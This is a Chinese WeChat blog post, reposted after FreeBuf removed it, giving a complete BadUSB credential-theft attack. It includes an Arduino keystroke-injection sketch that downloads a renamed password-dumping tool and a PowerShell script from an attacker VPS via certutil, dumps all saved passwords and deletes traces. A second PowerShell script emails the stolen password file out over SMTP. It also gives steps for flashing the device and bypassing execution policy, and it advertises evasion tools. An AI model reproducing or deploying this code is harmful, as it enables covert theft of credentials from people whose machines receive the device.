<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Bfbkzt28tqROpzZWuWs4jw)

  ![](https://mmbiz.qpic.cn/sz_mmbiz_png/x5oSJqsiavIibT7zN5Ng0riatokZjibdOsdaJUAT8KkH6RXEKlPPqz3dT7pvlWIEH0wWsOD6ic0zb3cZUvHv0ANHjBg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**点击上方蓝字** ****关注【渗透测试】不迷路****

  

  

    月黑风高逛 FreeBuf 看到前两年写的文章被下架了，下架原因 " **内容敏感请补充防护建议** " 想了想把它搬过来吧，记录一下曾经，**不喜勿喷，大佬轻喷**。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNxEkyt54iaQA3dHHz4MiaDl2NbV0DPdEJO7tHiamXicYzZCjPUZIlEEEtYRQ/640?wx_fmt=png&from=appmsg)  

### 涉及工具

Arduino IDE（烧录工具）  
BadUsB（实体设备）  
LaZagne（主机密码获取工具）  
PowerShell（系统自带）  
邮箱的授权码（外连接收）

**工具获取方式**~ **文末参与抽奖**

关注公众号，后台回复关键词 " **0604** " 获取  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNxN3Xv5RLmd3NWpUccFWy1My4ibYDlusWAu59g9BWwVZBf9JBed6W41bQ/640?wx_fmt=png&from=appmsg)              

### **前言**  

中心思想：目标主机插入 BadUsB 设备自动获取到当前的所有密码写到文件然后发送到邮箱中。

### **世界上最邪恶的 USB 设备**

我这个小菜鸡大致理解如下：

> 设备名称叫 BadUsB，它不同于 U 盘里携带的病毒，严格来说 BadUsB 不算是 U 盘，它也不提供存储的功能。但是正因为它将恶意代码置于硬件中，使得杀毒软件以及 U 盘格式化等防范措施都对它无效。

这里就放大佬总结的 BadUSB 详细介绍：https://www.baidu.com/baidu?ie=utf-8&wd=BadUSB%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNxWqbHbkUvAOOI21d2icmtibaicRkIkbpUMGOm3ScSAPtl87GJOCqIiaQTAA/640?wx_fmt=jpeg)

### **演示**

此处演示本来录的视频来自，由于**部分敏感信息**限制，这里直接放运行过程截图了。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNxBdIgsnR7mCibe5LEw0ukCDBbwibxnyiaxC8tQm3G3uIpj9KtBIVuUp1PQ/640?wx_fmt=jpeg&from=appmsg)

查看邮件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNxFFFibFjSsRDapDQgBhqibicdkKH7nT56xO430r3yQ7KsK4n6fxfiauHYPQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNx5SibVic2p390HB6iaUxOMDvxr4rvYmbF2JSr3jJzYlZibsJUZ2aFUltfrQ/640?wx_fmt=png&from=appmsg)

**仅用于技术交流，请勿用于非法用途**。****  

### 代码在下方！！！！！！！

自动获取目标主机所有密码的脚本 GetPass.ino
---------------------------

```
#include<Keyboard.h>
void setup()
{
  Keyboard.begin();//初始化键盘通讯
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键
  Keyboard.press('r');//r键
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("CMD");
  delay(1000);
  Keyboard.println("certutil -urlcache -split -f http:<YOU VPS>/KissGeek/PASSTOOLS.EXE d:\\setup_11.5.0.exe");//下载密码截取工具,因为开启了大小写混淆所以说这里要大写
  delay(10000);
  Keyboard.println("certutil -urlcache -split -f http:<YOU VPS>/KissGeek/PassUp.PS1 d:\\setup_11.5.0.PS1");//下载powershell脚本
  delay(1000);
  Keyboard.println("d:\\SETUP_11.5.0.EXE ALL > d:\\pass.txt");//获取的密码放到pass.txt
  delay(500);
  Keyboard.println("POWERSHELL d:\\SETUP_11.5.0.PS1");
  Keyboard.println("DEL d:\\pass.txt,d:\\setup_11.5.0.PS1,d:\\setup_11.5.0.exe");//删除程序
  Keyboard.println("EXIT");//退出powershell
  Keyboard.println("EXIT");//退出cmd
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯
}
void loop() {}

```

把获取到的密码发送到邮箱的脚本 PassUP.ps1（PowerShell）
--------------------------------------

```
$SMTPServer = 'smtp.qq.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('你的邮箱', '邮箱密钥');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = '你的邮箱'
$ReportEmail.To.Add('你的邮箱')
$ReportEmail.Subject = 'GetPass'
$ReportEmail.Body = 'Passwords In Applications'
$ReportEmail.Attachments.Add('F:\pass.txt')
$SMTPInfo.Send($ReportEmail)
attrib +h pass.txt

```

无法运行 ps1 脚本时需要管理员方式运行 powershell 然后输入：

```
set-ExecutionPolicy RemoteSigned

```

### 烧录软件

这里使用的是：Arduino IDE 1.8.12（可以使用最新版）  

-------------------------------------

https://www.arduino.cn/thread-5838-1-1.html
-------------------------------------------

安装完成后，打开 Arduino IDE 选择 “工具”-->"开发板"-->"Arduino Leonaedo"，选择 BadUsB 设备的 "端口"  
烧录前选择好自己的板和端口，点击左上角的✔ 验证代码的完整性可用性，点击旁边的上传按钮将代码烧录到 BadUsB 设备。
-------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/z3TOtprWtZicaCy8uuRfYGqrtVapWFXNxgkoy6MSr7iaT6HWk6ibyoC0oN0oTLcagwtY32JRtKWoWqlsZgV3yzic2g/640?wx_fmt=jpeg&from=appmsg)

烧录完成后当目标主机插入后自动运行 BadUsB 设备里的脚本。
--------------------------------

### 获取途径

领取要求：点赞，在看，转发本文章至朋友圈并集赞 10 个，截止开奖前不删不设分组屏蔽。

‍↓↓↓参与抽奖↓↓↓  

**【兑奖需知】**

1 - 关注公众号；  
2 - 转发本文至朋友圈；  
3 - 兑奖需出示朋友圈转发截图（不设分组屏蔽）并集赞 10 个；  
转发语——关注转发抽奖，速来  
4 - 开奖前不得删除朋友圈，开奖后转发无效；

技术交流
----

    扫描下方二维码，并在验证信息中说明来意，文章仅供交流学习, 本公众号不承担任何有关责任!  

****星球介绍****

自研工具、二开工具、免杀工具、漏洞复现、教程等资源、漏洞挖掘分析、网络安全相关资料分享。

![](https://mmbiz.qpic.cn/mmbiz_jpg/z3TOtprWtZibxicaHzm6icoKWFPFB9gcBcv3aWA5wEMcgOXfZpDoqgYicfibMPBzx2Jle7p28TWsEGCdgwsDRwhUy2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

**免责声明**  

该项目仅供网络安全研究使用，禁止使用该项目进行违法操作，否则自行承担后果。

感谢您抽出

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&tp=wxpic&wxfrom=5&wx_lazy=1)

.

![](https://mmbiz.qpic.cn/mmbiz_gif/TN05MmJLxMqo7nNcs6SpCP3YzricnkicX0bkrIibkdGXckNLtQ3nkzOLcLnEnRq1ANgP8qAyqUouKOGxhpHvEs8jw/640?wx_fmt=gif&tp=wxpic&wxfrom=5&wx_lazy=1)

.

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&tp=wxpic&wxfrom=5&wx_lazy=1)

阅读本文